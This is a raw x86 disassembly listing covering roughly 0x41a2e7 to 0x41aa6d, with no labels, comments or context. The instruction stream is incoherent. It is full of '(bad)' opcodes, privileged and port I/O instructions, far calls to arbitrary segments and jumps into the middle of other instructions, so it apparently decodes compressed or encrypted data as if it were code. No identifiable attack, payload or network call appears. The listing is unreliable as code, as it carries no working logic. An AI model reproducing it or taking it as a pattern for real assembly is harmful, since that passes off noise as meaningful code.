  41a2e7:	jbe    0x41a2a3
  41a2e9:	bound  edi,QWORD PTR [eax+0x7c2cd56b]
  41a2ef:	and    esi,DWORD PTR [edx+0x7321598]
  41a2f5:	mov    bh,0x14
  41a2f7:	fcom   QWORD PTR [esi-0x4c]
  41a2fa:	clc    
  41a2fb:	enter  0xbea5,0x7
  41a2ff:	shl    BYTE PTR [eax],cl
  41a301:	cld    
  41a302:	ja     0x41a310
  41a304:	push   eax
  41a305:	push   esp
  41a306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a307:	loop   0x41a387
  41a309:	add    esi,0x31
  41a30c:	rcl    DWORD PTR [edi-0x15],0xa6
  41a310:	push   eax
  41a311:	arpl   WORD PTR [edi+ebp*4-0x67],ax
  41a315:	sbb    ah,BYTE PTR [ebp-0x5d]
  41a318:	stos   BYTE PTR es:[edi],al
  41a319:	pop    es
  41a31a:	jmp    0x41a2d7
  41a31c:	mov    ch,0x7d
  41a31e:	jne    0x41a2b6
  41a320:	je     0x41a34a
  41a322:	rcl    ecx,cl
  41a324:	cli    
  41a325:	les    esi,FWORD PTR [esp+eiz*8-0xd]
  41a329:	xchg   esp,eax
  41a32a:	in     al,0x24
  41a32c:	jo     0x41a391
  41a32e:	jecxz  0x41a330
  41a330:	fsub   QWORD PTR [esi-0x77]
  41a333:	es jg  0x41a351
  41a336:	sbb    esi,DWORD PTR [esi+edi*4-0x4e9ced13]
  41a33d:	test   eax,0x850b76c7
  41a342:	mov    WORD PTR [esi],gs
  41a344:	pop    ecx
  41a345:	mov    al,ds:0x91b47da2
  41a34a:	jns    0x41a323
  41a34c:	popf   
  41a34d:	popa   
  41a34e:	pop    ecx
  41a34f:	gs lock dec ecx
  41a352:	enter  0x427b,0x57
  41a356:	cmp    eax,0xb4447f44
  41a35b:	mov    eax,edi
  41a35d:	bound  edi,QWORD PTR [esi+0x6dde54cb]
  41a363:	inc    esp
  41a364:	jmp    0xad2d:0x850a6867
  41a36b:	mov    bh,0xfb
  41a36d:	(bad)  
  41a36e:	jle    0x41a370
  41a370:	(bad)  
  41a371:	mov    ds:0xe30acfaf,al
  41a376:	idiv   DWORD PTR [edx]
  41a378:	cs dec ecx
  41a37a:	loopne 0x41a3a0
  41a37c:	push   ecx
  41a37d:	hlt    
  41a37e:	lds    edi,FWORD PTR [esi]
  41a380:	popa   
  41a381:	sub    al,0x0
  41a383:	call   0xab2990d1
  41a388:	inc    DWORD PTR [eax]
  41a38a:	das    
  41a38b:	inc    esp
  41a38c:	sbb    eax,0x2c19223a
  41a391:	push   0xffffffbc
  41a393:	mov    cl,0x93
  41a395:	jo     0x41a325
  41a397:	pushf  
  41a398:	xor    al,0x6
  41a39a:	xor    eax,0x17cab5d1
  41a39f:	into   
  41a3a0:	and    al,0x11
  41a3a2:	imul   eax,DWORD PTR ds:0xaeeb35c5,0x268c1fe2
  41a3ac:	push   ds
  41a3ad:	xor    edi,DWORD PTR [eax+eiz*2+0x22]
  41a3b1:	outs   dx,BYTE PTR ds:[esi]
  41a3b2:	xor    eax,0x9e096789
  41a3b7:	pop    esi
  41a3b8:	stos   DWORD PTR es:[edi],eax
  41a3b9:	fstp   TBYTE PTR [ebx-0x75a4b5db]
  41a3bf:	jbe    0x41a3fd
  41a3c1:	jg     0x41a34c
  41a3c3:	push   ebp
  41a3c4:	call   0x9c39:0xbb9d3d98
  41a3cb:	aad    0xa6
  41a3cd:	addr16 pusha 
  41a3cf:	aam    0xf6
  41a3d1:	add    ebp,DWORD PTR [eax]
  41a3d3:	gs mov esi,0x6538baa8
  41a3d9:	dec    esi
  41a3da:	mov    dh,0x8e
  41a3dc:	cmp    ah,dh
  41a3de:	xor    al,0xe4
  41a3e0:	fnstcw WORD PTR [eax+0x2a]
  41a3e3:	jnp    0x41a448
  41a3e5:	sbb    ch,BYTE PTR [eax-0x1]
  41a3e8:	aas    
  41a3e9:	out    dx,eax
  41a3ea:	and    eax,0x2d4269f3
  41a3ef:	pop    eax
  41a3f0:	jns    0x41a378
  41a3f2:	nop
  41a3f3:	xor    edi,edx
  41a3f5:	pushf  
  41a3f6:	nop
  41a3f7:	test   dl,al
  41a3f9:	aas    
  41a3fa:	pop    esp
  41a3fb:	data16 wrmsr 
  41a3fe:	aaa    
  41a3ff:	add    eax,0xe4f7e0b3
  41a404:	scas   al,BYTE PTR es:[edi]
  41a405:	jns    0x41a3c7
  41a407:	icebp  
  41a408:	popf   
  41a409:	sub    al,0x92
  41a40b:	cwde   
  41a40c:	adc    BYTE PTR [esi-0x73],bl
  41a40f:	fcomp  DWORD PTR [ebx-0x545caecb]
  41a415:	push   cs
  41a416:	jge    0x41a40b
  41a418:	push   ebx
  41a419:	sahf   
  41a41a:	pusha  
  41a41b:	or     al,0x62
  41a41d:	pop    ss
  41a41e:	xchg   edi,eax
  41a41f:	mov    ds:0xccc20544,eax
  41a424:	dec    ecx
  41a425:	shl    DWORD PTR ds:0x35ae8e03,1
  41a42b:	xchg   BYTE PTR [edi],cl
  41a42d:	ss ins BYTE PTR es:[edi],dx
  41a42f:	lods   al,BYTE PTR ds:[esi]
  41a430:	cmp    ecx,DWORD PTR [edx-0x26]
  41a433:	cmp    al,0x30
  41a435:	pop    ds
  41a436:	fdivr  st,st(6)
  41a438:	cwde   
  41a439:	sbb    BYTE PTR [esi+0x1d7f6905],dh
  41a43f:	or     eax,0x33e76d70
  41a444:	xchg   edi,eax
  41a445:	push   0xffffffd1
  41a447:	xchg   ebx,eax
  41a448:	cmp    DWORD PTR [edx+0xa24fafa],edx
  41a44e:	pop    ds
  41a44f:	js     0x41a48d
  41a451:	popf   
  41a452:	cmp    DWORD PTR [edx-0x7af750c5],ebp
  41a458:	ror    DWORD PTR [ecx+ecx*2],0x6f
  41a45c:	adc    BYTE PTR [edi-0x5b2c66cf],bh
  41a462:	lea    esi,ds:0x1928f0a4
  41a468:	add    ah,BYTE PTR [ecx+0x284a78a]
  41a46e:	mov    ah,0xc6
  41a470:	jb     0x41a49b
  41a472:	push   ss
  41a473:	data16 jbe 0x41a485
  41a476:	aas    
  41a477:	sbb    BYTE PTR [eax],al
  41a479:	pop    esi
  41a47a:	fimul  WORD PTR [edx]
  41a47c:	sar    DWORD PTR [edx-0x2ff1fc91],0x87
  41a483:	push   edx
  41a484:	xor    al,0x66
  41a486:	cli    
  41a487:	mov    ebp,0x1f8bea1
  41a48c:	adc    eax,0x16691ceb
  41a491:	sbb    DWORD PTR [ecx-0x4178bff2],edx
  41a497:	dec    ebp
  41a498:	aas    
  41a499:	add    dl,al
  41a49b:	xchg   BYTE PTR [edx],ch
  41a49d:	xor    al,0xaa
  41a49f:	int3   
  41a4a0:	xor    eax,0x551b1ce9
  41a4a5:	inc    ebx
  41a4a6:	xchg   esp,eax
  41a4a7:	out    0x31,al
  41a4a9:	pop    esp
  41a4aa:	mov    DWORD PTR [edi],esp
  41a4ac:	xchg   edx,eax
  41a4ad:	pop    eax
  41a4ae:	mov    esp,0xcdb532c4
  41a4b3:	pop    ebp
  41a4b4:	adc    BYTE PTR [edi-0x2466a783],bh
  41a4ba:	adc    al,0xf3
  41a4bc:	push   ds
  41a4bd:	cmp    ebp,esp
  41a4bf:	xor    al,0x12
  41a4c1:	sbb    al,0x52
  41a4c3:	lahf   
  41a4c4:	mov    eax,ds:0xc3c6f5d7
  41a4c9:	mov    esp,0x5c929ae0
  41a4ce:	or     BYTE PTR [ebx-0x55],bl
  41a4d1:	pop    esi
  41a4d2:	cld    
  41a4d3:	jns    0x41a4c3
  41a4d5:	push   0xa3346e0c
  41a4da:	xor    DWORD PTR [edi-0x1b],ebp
  41a4dd:	mov    edx,0xe1726ce4
  41a4e2:	xor    BYTE PTR [edx],cl
  41a4e4:	fnstsw WORD PTR [edi]
  41a4e6:	and    al,BYTE PTR [ebx]
  41a4e8:	lahf   
  41a4e9:	cmp    al,0x32
  41a4eb:	and    eax,0xb297405
  41a4f0:	dec    esi
  41a4f1:	lock mov ah,0x61
  41a4f4:	adc    eax,DWORD PTR [esp+edx*1+0xc2412ca]
  41a4fb:	into   
  41a4fc:	push   ebp
  41a4fd:	retf   
  41a4fe:	bound  ebx,QWORD PTR [edx+0x6d]
  41a501:	(bad)  
  41a502:	aas    
  41a503:	loopne 0x41a4e0
  41a505:	retf   
  41a506:	stos   BYTE PTR es:[edi],al
  41a507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a508:	add    al,0x36
  41a50a:	jle    0x41a576
  41a50c:	fs jno 0x41a4a6
  41a50f:	pop    ebx
  41a510:	fwait
  41a511:	in     eax,dx
  41a512:	or     BYTE PTR [eax],al
  41a514:	mov    ebp,0x80118202
  41a519:	not    DWORD PTR [ecx+0x21]
  41a51c:	enter  0x413e,0xe
  41a520:	popa   
  41a521:	retf   0xe813
  41a524:	fsub   st(0),st
  41a526:	pop    edi
  41a527:	sbb    DWORD PTR [edx+0x11c1e2f2],esp
  41a52d:	mov    ch,0x80
  41a52f:	mov    WORD PTR [edx],?
  41a531:	imul   eax,ecx,0xeb763f86
  41a537:	loopne 0x41a595
  41a539:	inc    esp
  41a53a:	call   0xe1bc0a4b
  41a53f:	and    DWORD PTR [esi],edx
  41a541:	add    dl,BYTE PTR [esi]
  41a543:	fadd   QWORD PTR [eax]
  41a545:	and    al,0x43
  41a547:	(bad)  
  41a548:	popa   
  41a549:	jo     0x41a527
  41a54b:	mov    dh,0x8a
  41a54d:	xchg   ecx,eax
  41a54e:	loope  0x41a59e
  41a550:	inc    ebp
  41a551:	cld    
  41a552:	add    al,dl
  41a554:	jns    0x41a4f3
  41a556:	(bad)
  41a55a:	xchg   DWORD PTR [eax+0x64],ecx
  41a55d:	inc    esp
  41a55e:	out    0x9f,eax
  41a560:	shl    BYTE PTR [ebx-0x4c],cl
  41a563:	retf   0x5e9d
  41a566:	imul   esi,DWORD PTR [edi*8+0x49c22a3a],0x46
  41a56e:	aaa    
  41a56f:	iret   
  41a570:	mov    eax,ds:0xbb821bb3
  41a575:	mov    ah,0x9a
  41a577:	add    BYTE PTR [ebx+0x1f],dh
  41a57a:	pop    eax
  41a57b:	or     ebx,0xffffffa1
  41a57e:	push   edi
  41a57f:	jae    0x41a567
  41a581:	dec    esi
  41a582:	jecxz  0x41a511
  41a584:	add    edi,DWORD PTR [edi+0x17]
  41a587:	add    DWORD PTR [esi],ebp
  41a589:	and    edx,DWORD PTR [esi-0x13]
  41a58c:	pop    ebx
  41a58d:	xor    eax,0x975f5e42
  41a592:	gs loopne 0x41a5bd
  41a595:	push   ebx
  41a596:	mov    bl,0x27
  41a598:	jmp    0x41a5ee
  41a59a:	fsubp  st(2),st
  41a59c:	rol    BYTE PTR [esi+0x7],cl
  41a59f:	call   DWORD PTR [ebx+0x5317ab6c]
  41a5a5:	xor    eax,0x97836865
  41a5aa:	lock mov eax,0xf2f716d4
  41a5b0:	pop    esi
  41a5b1:	shl    BYTE PTR [edx],1
  41a5b3:	mov    dh,ah
  41a5b5:	sub    DWORD PTR [ebx-0x402ae28],0xffffffd1
  41a5bc:	adc    eax,0x595dabd8
  41a5c1:	pop    ebx
  41a5c2:	push   es
  41a5c3:	retf   0xedc0
  41a5c6:	jp     0x41a593
  41a5c8:	cmp    BYTE PTR [ebx+0x1c],0x23
  41a5cc:	mov    bh,BYTE PTR [eax-0xa]
  41a5cf:	pop    ebp
  41a5d0:	outs   dx,DWORD PTR ds:[esi]
  41a5d1:	xchg   edx,eax
  41a5d2:	nop
  41a5d3:	push   ds
  41a5d4:	mov    al,0xc0
  41a5d6:	xlat   BYTE PTR ds:[ebx]
  41a5d7:	idiv   DWORD PTR [eax]
  41a5d9:	jae    0x41a64d
  41a5db:	dec    ebp
  41a5dc:	mov    ah,BYTE PTR [edx-0x5375108f]
  41a5e2:	out    0xbf,eax
  41a5e4:	daa    
  41a5e5:	arpl   WORD PTR [ebp+0xb23b818],cx
  41a5eb:	inc    edx
  41a5ec:	or     cl,cl
  41a5ee:	mov    ch,0x14
  41a5f0:	aad    0x82
  41a5f2:	shl    BYTE PTR [ebp-0x15da62f7],0xb4
  41a5f9:	pop    ecx
  41a5fa:	pop    esp
  41a5fb:	adc    BYTE PTR [esi*8-0x3d220017],dh
  41a602:	jecxz  0x41a66d
  41a604:	inc    esp
  41a605:	(bad)  
  41a606:	repnz lds esi,FWORD PTR [esi+eiz*1-0x13]
  41a60b:	(bad)  
  41a60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a60d:	(bad)  
  41a60e:	cmp    DWORD PTR [eax-0x27],esi
  41a611:	test   BYTE PTR [ecx+0xf],0x81
  41a615:	enter  0xd79f,0x20
  41a619:	imul   esp,DWORD PTR [ecx],0x5d
  41a61c:	stc    
  41a61d:	push   0xb842c2e1
  41a622:	pop    ss
  41a623:	sub    ebp,DWORD PTR [edi+0x29e9efbb]
  41a629:	sbb    eax,0xd0eb8eda
  41a62e:	or     BYTE PTR [ebp+0x731d4d30],ah
  41a634:	push   es
  41a635:	push   edx
  41a636:	and    eax,0xbe49e5db
  41a63b:	cwde   
  41a63c:	mov    dh,0x5c
  41a63e:	sub    esp,ebp
  41a640:	(bad)  
  41a641:	mov    eax,0x6eb95bab
  41a646:	mov    bh,0x8d
  41a648:	in     al,dx
  41a649:	pop    ds
  41a64a:	(bad)  
  41a64b:	or     ebx,esp
  41a64d:	add    cl,bh
  41a64f:	jge    0x41a64b
  41a651:	push   edx
  41a652:	mov    cl,0xc1
  41a654:	jp     0x41a675
  41a656:	mov    ds:0xdf50aafc,eax
  41a65b:	je     0x41a685
  41a65d:	pop    ebx
  41a65e:	or     BYTE PTR [esi*4-0x1c996bf6],dh
  41a665:	add    al,0xc6
  41a667:	retf   
  41a668:	and    ch,BYTE PTR [edi-0x27aec2db]
  41a66e:	shr    BYTE PTR [eax+0x35],0xcf
  41a672:	fwait
  41a673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a674:	shr    DWORD PTR [ebx+ecx*1+0x49],cl
  41a678:	ret    
  41a679:	int    0x2b
  41a67b:	cmp    eax,0xc195cd57
  41a680:	shr    BYTE PTR [edi-0x73acd9a0],0x98
  41a687:	or     eax,DWORD PTR [edx]
  41a689:	jmp    0x5eacde71
  41a68e:	pushf  
  41a68f:	pop    es
  41a690:	adc    BYTE PTR [ebx],bl
  41a692:	inc    edi
  41a693:	in     eax,dx
  41a694:	mov    eax,0x1a7e8606
  41a699:	xchg   DWORD PTR [esi-0x32],eax
  41a69c:	je     0x41a6c7
  41a69e:	std    
  41a69f:	fistp  QWORD PTR [ebp+edi*8+0x68]
  41a6a3:	or     al,BYTE PTR [eax-0x4a]
  41a6a6:	and    dl,ch
  41a6a8:	adc    al,0x24
  41a6aa:	dec    esi
  41a6ab:	mov    dl,0xe6
  41a6ad:	mov    esp,0x83f3d3f1
  41a6b2:	sti    
  41a6b3:	and    BYTE PTR [bp+0x7979],ch
  41a6b8:	pop    eax
  41a6b9:	adc    bl,dh
  41a6bb:	pop    esi
  41a6bc:	add    esp,0xd8082009
  41a6c2:	sub    al,BYTE PTR [ebx]
  41a6c4:	jp     0x41a66a
  41a6c6:	sub    eax,0xeb314555
  41a6cb:	jne    0x41a6a0
  41a6cd:	mov    al,0xfe
  41a6cf:	icebp  
  41a6d0:	std    
  41a6d1:	pop    eax
  41a6d2:	in     al,dx
  41a6d3:	iret   
  41a6d4:	or     bh,BYTE PTR [edx-0x44]
  41a6d7:	and    eax,0x55850331
  41a6dc:	je     0x41a695
  41a6de:	mov    cx,0x8d9e
  41a6e2:	mov    edi,0x13f3661b
  41a6e7:	icebp  
  41a6e8:	dec    BYTE PTR [edi+0x8eccd93]
  41a6ee:	(bad)  
  41a6ef:	scas   eax,DWORD PTR es:[edi]
  41a6f0:	and    dl,BYTE PTR [edi]
  41a6f2:	jns    0x41a73f
  41a6f4:	or     ebp,DWORD PTR [edi+0x12ad501]
  41a6fa:	and    al,0xf1
  41a6fc:	inc    ebp
  41a6fd:	sbb    eax,0xe4419523
  41a702:	jp     0x41a71d
  41a704:	sbb    DWORD PTR [eax-0x6],ecx
  41a707:	mov    al,ds:0x8b9701cf
  41a70c:	adc    bl,dl
  41a70e:	dec    eax
  41a70f:	loopne 0x41a6b6
  41a711:	fcom   DWORD PTR [ebp+esi*4+0x1d]
  41a715:	test   eax,0x81cee63e
  41a71a:	mov    ebp,DWORD PTR ds:0x808bd0ab
  41a720:	or     DWORD PTR [eax+0x21602a38],ebp
  41a726:	loope  0x41a6d0
  41a728:	clc    
  41a729:	aas    
  41a72a:	cmc    
  41a72b:	or     eax,edi
  41a72d:	pushf  
  41a72e:	loop   0x41a733
  41a730:	adc    edi,DWORD PTR [edx+0x24]
  41a733:	fisttp DWORD PTR [ebx-0x182eae77]
  41a739:	outs   dx,BYTE PTR ds:[esi]
  41a73a:	call   0xddf1:0x1a5bd177
  41a741:	test   DWORD PTR [edi-0x36],esp
  41a744:	xor    edi,DWORD PTR [edx+ebp*2+0x57]
  41a748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a749:	add    BYTE PTR [ecx-0x4c0446fe],dh
  41a74f:	adc    BYTE PTR [esi-0x2a],0xc5
  41a753:	pop    edi
  41a754:	fstp   DWORD PTR [edi-0x35ba3c1b]
  41a75a:	out    dx,eax
  41a75b:	sar    DWORD PTR [ebx-0x58],0xed
  41a75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a760:	sbb    DWORD PTR [edi-0x4b],esp
  41a763:	test   ch,0xb
  41a766:	fs mov edx,0x7a95a37a
  41a76c:	cli    
  41a76d:	pop    edx
  41a76e:	(bad)  
  41a770:	sbb    DWORD PTR [edi-0x1f],eax
  41a773:	jo     0x41a750
  41a775:	in     eax,0xcb
  41a777:	shl    BYTE PTR [edi+0x1f5b8378],cl
  41a77d:	dec    edx
  41a77e:	mov    dh,0xd8
  41a780:	es stc 
  41a782:	sbb    BYTE PTR [esi+eax*1+0xd],bh
  41a786:	arpl   WORD PTR [edi+edi*4],bx
  41a789:	and    al,0x55
  41a78b:	jge    0x41a7fb
  41a78d:	or     eax,0xdd65c4db
  41a792:	add    eax,0xb0152763
  41a797:	inc    edi
  41a798:	arpl   bx,ax
  41a79a:	mov    bp,0xc3f6
  41a79e:	pop    eax
  41a79f:	stos   DWORD PTR es:[edi],eax
  41a7a0:	mov    esi,DWORD PTR [edi-0x2c903d2f]
  41a7a6:	dec    esi
  41a7a7:	push   ecx
  41a7a8:	fild   WORD PTR [ebx]
  41a7aa:	push   ds
  41a7ab:	aaa    
  41a7ac:	xchg   edx,eax
  41a7ad:	in     al,0xb1
  41a7af:	push   cs
  41a7b0:	sub    esp,DWORD PTR [ebx-0x54]
  41a7b3:	ins    BYTE PTR es:[edi],dx
  41a7b4:	xor    DWORD PTR [ecx+0x20f4aa09],0x35
  41a7bb:	cmp    al,0x9f
  41a7bd:	lea    eax,[edi]
  41a7bf:	sbb    DWORD PTR [esi],esi
  41a7c1:	test   ebx,0x560009da
  41a7c7:	add    eax,0xf8eb43cd
  41a7cc:	pop    ecx
  41a7cd:	pop    esi
  41a7ce:	or     esi,DWORD PTR [edx-0x76ec9cf4]
  41a7d4:	test   BYTE PTR [edx-0x4d],bh
  41a7d7:	call   FWORD PTR [ebp+esi*4+0x6f]
  41a7db:	sbb    al,0xd3
  41a7dd:	sbb    esp,0x21a89481
  41a7e3:	je     0x41a862
  41a7e5:	int3   
  41a7e6:	xchg   esi,eax
  41a7e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7e8:	ror    BYTE PTR [ecx],0xea
  41a7eb:	xor    al,0x66
  41a7ed:	mov    gs,WORD PTR [eax-0x263e6c52]
  41a7f3:	jo     0x41a854
  41a7f5:	push   esi
  41a7f6:	mov    ecx,0x4bcbe63b
  41a7fb:	adc    DWORD PTR [esi-0x22],0x11
  41a7ff:	stos   BYTE PTR es:[edi],al
  41a800:	pushw  ds
  41a802:	jg     0x41a78e
  41a804:	mov    esp,0x4192fdf1
  41a809:	dec    edi
  41a80a:	push   eax
  41a80b:	out    0x7,eax
  41a80d:	and    al,BYTE PTR [edx-0x2080dafd]
  41a813:	aam    0xe3
  41a815:	sbb    eax,0xed0ddc07
  41a81a:	std    
  41a81b:	mov    esp,0x2fa649c4
  41a820:	not    DWORD PTR [ecx+0x13]
  41a823:	xor    DWORD PTR [edx-0x52e337eb],eax
  41a829:	out    0xc,al
  41a82b:	js     0x41a82d
  41a82d:	fst    QWORD PTR [edi+0x43d6ca4e]
  41a833:	in     eax,dx
  41a834:	dec    edi
  41a835:	add    edi,DWORD PTR ds:0x246eb02b
  41a83b:	jae    0x41a80f
  41a83d:	sub    eax,0xb8e711ad
  41a842:	inc    esi
  41a843:	sti    
  41a844:	arpl   WORD PTR [ecx-0x66],di
  41a847:	push   esp
  41a848:	popf   
  41a849:	es pop eax
  41a84b:	mul    DWORD PTR [ecx]
  41a84d:	xchg   ecx,eax
  41a84e:	mov    dl,0x7f
  41a850:	rcl    BYTE PTR [ebp+0x59],0xab
  41a854:	(bad)  
  41a855:	sub    eax,0xfc969c76
  41a85a:	pop    ebx
  41a85b:	iret   
  41a85c:	(bad)  [ecx-0x6eb6361f]
  41a862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a863:	jne    0x41a81f
  41a865:	fnsave [esi]
  41a867:	jbe    0x41a845
  41a869:	mov    bl,0x9c
  41a86b:	jle    0x41a816
  41a86d:	pop    edi
  41a86e:	mov    ds:0xd99503ca,al
  41a873:	or     eax,0x377efbaf
  41a878:	ja     0x41a81d
  41a87a:	or     al,0x99
  41a87c:	outs   dx,BYTE PTR ds:[esi]
  41a87d:	pop    esi
  41a87e:	mov    edx,ds
  41a880:	mov    WORD PTR [edi+0x2b],?
  41a883:	out    dx,al
  41a884:	lods   eax,DWORD PTR ds:[esi]
  41a885:	mov    dl,0xdd
  41a887:	and    al,0x50
  41a889:	mov    edi,0x9061dbb4
  41a88e:	(bad)  
  41a88f:	sar    esi,1
  41a891:	mov    esp,0xf3866e28
  41a896:	test   al,0x6b
  41a898:	je     0x41a905
  41a89a:	not    BYTE PTR [ebx-0x71e5363e]
  41a8a0:	push   esi
  41a8a1:	dec    ecx
  41a8a2:	pop    ebx
  41a8a3:	jo     0x41a8de
  41a8a5:	cmp    eax,0x7a984826
  41a8aa:	or     edi,DWORD PTR [edi]
  41a8ac:	test   DWORD PTR [edx],esi
  41a8ae:	dec    edi
  41a8af:	or     edi,edi
  41a8b1:	call   FWORD PTR [ebx-0x49d1cfa2]
  41a8b7:	pop    edi
  41a8b8:	xor    DWORD PTR [eax-0x6f6f7154],esp
  41a8be:	popa   
  41a8bf:	int3   
  41a8c0:	or     dl,BYTE PTR [edi-0x13ad478a]
  41a8c6:	sbb    esi,DWORD PTR [ebx-0x7f]
  41a8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ca:	stos   DWORD PTR es:[edi],eax
  41a8cb:	es cmc 
  41a8cd:	call   0x4186:0x9d5710ad
  41a8d4:	in     eax,0x2e
  41a8d6:	repz leave 
  41a8d8:	enter  0xd80c,0x6b
  41a8dc:	retf   
  41a8dd:	mov    ebp,0x9781926e
  41a8e2:	fs push esi
  41a8e4:	xchg   esp,eax
  41a8e5:	push   edi
  41a8e6:	sbb    esp,eax
  41a8e8:	(bad)  
  41a8e9:	call   0x24a8:0x72c6a5ae
  41a8f0:	push   ecx
  41a8f1:	jnp    0x41a877
  41a8f3:	call   0xfc01dfdf
  41a8f8:	and    BYTE PTR [edx+0x38],cl
  41a8fb:	test   eax,0x1565081c
  41a900:	cmp    DWORD PTR [esi],0x82e3a514
  41a906:	mov    esi,0x3cc36685
  41a90b:	mov    ch,0xe7
  41a90d:	and    esi,DWORD PTR [edx]
  41a90f:	stos   BYTE PTR es:[edi],al
  41a910:	or     eax,0x62f2fd47
  41a915:	xor    al,0xf9
  41a917:	or     bl,BYTE PTR [edi+ebp*2]
  41a91a:	inc    esi
  41a91b:	mov    ch,dl
  41a91d:	add    ebx,DWORD PTR [ecx-0x20]
  41a920:	out    dx,eax
  41a921:	gs jmp 0x7d88:0x7f25bc46
  41a929:	iret   
  41a92a:	and    BYTE PTR [edx-0x5b],cl
  41a92d:	lock dec DWORD PTR [esi]
  41a930:	(bad)
  41a933:	xor    al,0x92
  41a935:	data16 jnp 0x41a8e5
  41a938:	push   0xff6ada53
  41a93d:	push   esi
  41a93e:	xor    al,0x29
  41a940:	sti    
  41a941:	pop    esi
  41a942:	test   eax,0x8422a19d
  41a947:	pop    esp
  41a948:	cld    
  41a949:	and    eax,0x43aba8ec
  41a94e:	(bad)  
  41a94f:	sbb    al,0x2a
  41a951:	mov    dh,0x85
  41a953:	adc    ecx,edi
  41a955:	jmp    0x41a9c7
  41a957:	mov    BYTE PTR [ecx-0x65],ah
  41a95a:	loop   0x41a99f
  41a95c:	daa    
  41a95d:	sbb    dl,BYTE PTR [eax-0x32e721c7]
  41a963:	sub    eax,DWORD PTR [ebp+eax*4-0x3b]
  41a967:	push   edx
  41a968:	je     0x41a98d
  41a96a:	ds scas eax,DWORD PTR es:[edi]
  41a96c:	add    bl,BYTE PTR [ebx+0x2c]
  41a96f:	lds    edx,FWORD PTR [ecx+ebp*1-0x43]
  41a973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a974:	push   esp
  41a975:	xor    al,0xd
  41a977:	cmp    BYTE PTR [ebx+0x2484ea96],ah
  41a97d:	jecxz  0x41a9b0
  41a97f:	mov    esp,0xfe1b52a3
  41a984:	imul   esi,DWORD PTR ds:0xd5aaf49,0x15
  41a98b:	in     al,dx
  41a98c:	dec    esp
  41a98d:	aas    
  41a98e:	mov    dh,0xf1
  41a990:	popf   
  41a991:	or     al,0x34
  41a993:	pop    ds
  41a994:	mov    eax,0x7fe4acf2
  41a999:	xcrypt-ctr (bad)
  41a99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a99b:	cwde   
  41a99c:	ins    BYTE PTR es:[edi],dx
  41a99d:	jecxz  0x41a9d7
  41a99f:	xchg   edi,eax
  41a9a0:	das    
  41a9a1:	jge    0x41a9b8
  41a9a3:	pop    eax
  41a9a4:	out    0x5f,eax
  41a9a6:	sti    
  41a9a7:	push   0x77d515ba
  41a9ac:	mov    al,ds:0x567472b7
  41a9b1:	sbb    eax,0xf2a7ac6d
  41a9b6:	inc    ecx
  41a9b7:	out    dx,al
  41a9b8:	mov    eax,ds:0x78447be5
  41a9bd:	or     DWORD PTR [ebp+0x30],edi
  41a9c0:	adc    dl,BYTE PTR [ebp+0x4fcc38b6]
  41a9c6:	jle    0x41a955
  41a9c8:	sub    eax,0x2275fb95
  41a9cd:	ins    BYTE PTR es:[edi],dx
  41a9ce:	sub    al,0xd2
  41a9d0:	std    
  41a9d1:	mov    eax,0x114c5079
  41a9d6:	push   cs
  41a9d7:	and    ebx,ebp
  41a9d9:	test   DWORD PTR [edx+0x76],0x9ce5b0ee
  41a9e0:	rol    ecx,0x8a
  41a9e3:	in     al,0x9f
  41a9e5:	add    al,0xf1
  41a9e7:	push   edi
  41a9e8:	and    ah,BYTE PTR [esi-0x5f]
  41a9eb:	dec    ebp
  41a9ec:	dec    ebp
  41a9ed:	sbb    BYTE PTR [esp+edx*4+0x53],dl
  41a9f1:	lods   al,BYTE PTR ds:[esi]
  41a9f2:	cli    
  41a9f3:	inc    esp
  41a9f4:	fs cld 
  41a9f6:	pop    eax
  41a9f7:	mov    eax,0x7b720a63
  41a9fc:	pusha  
  41a9fd:	pop    esp
  41a9fe:	cdq    
  41a9ff:	jno    0x41a9c1
  41aa01:	lock (bad) 
  41aa04:	pop    eax
  41aa05:	sbb    al,0xc4
  41aa07:	ret    0x1c96
  41aa0a:	mov    ss,WORD PTR [ebx]
  41aa0c:	loop   0x41a9b0
  41aa0e:	cs jle 0x41aa51
  41aa11:	jp     0x41a9a4
  41aa13:	or     bh,bl
  41aa15:	mov    ebx,DWORD PTR [eax+0xe]
  41aa18:	jb     0x41aa11
  41aa1a:	cmp    bh,BYTE PTR [edx+0x5b]
  41aa1d:	into   
  41aa1e:	sbb    edx,DWORD PTR [eax]
  41aa20:	cwde   
  41aa21:	pop    ss
  41aa22:	xor    ebp,esi
  41aa24:	inc    ebx
  41aa25:	jb     0x41aa46
  41aa27:	(bad)  
  41aa28:	xchg   ebx,eax
  41aa29:	xor    BYTE PTR [esi+0x10],ch
  41aa2c:	pop    ebx
  41aa2d:	pop    ecx
  41aa2e:	mov    dl,BYTE PTR [esi]
  41aa30:	stos   DWORD PTR es:[edi],eax
  41aa31:	mov    al,0x92
  41aa33:	add    BYTE PTR [esp+esi*8],cl
  41aa36:	hlt    
  41aa37:	scas   al,BYTE PTR es:[edi]
  41aa38:	add    dl,BYTE PTR [ebx-0x2b]
  41aa3b:	pop    eax
  41aa3c:	std    
  41aa3d:	push   ebx
  41aa3e:	iret   
  41aa3f:	add    al,0x16
  41aa41:	xchg   ecx,eax
  41aa42:	lds    eax,FWORD PTR [edi-0x79]
  41aa45:	add    DWORD PTR [ecx+eiz*1],esi
  41aa48:	and    eax,0x447ee1d0
  41aa4d:	and    DWORD PTR [esi-0x7ae9fda0],esi
  41aa53:	jle    0x41aa9e
  41aa55:	mov    ds:0xc7e11e7b,eax
  41aa5a:	loop   0x41aa3f
  41aa5c:	add    DWORD PTR [eax],eax
  41aa5e:	aad    0x47
  41aa60:	jp     0x41aab5
  41aa62:	lods   al,BYTE PTR ds:[esi]
  41aa63:	inc    edi
  41aa64:	(bad)  
  41aa65:	mov    dh,0x6e
  41aa67:	leave  
  41aa68:	adc    eax,0x52e16780
  41aa6d:	sbb    eax,0xca39a052
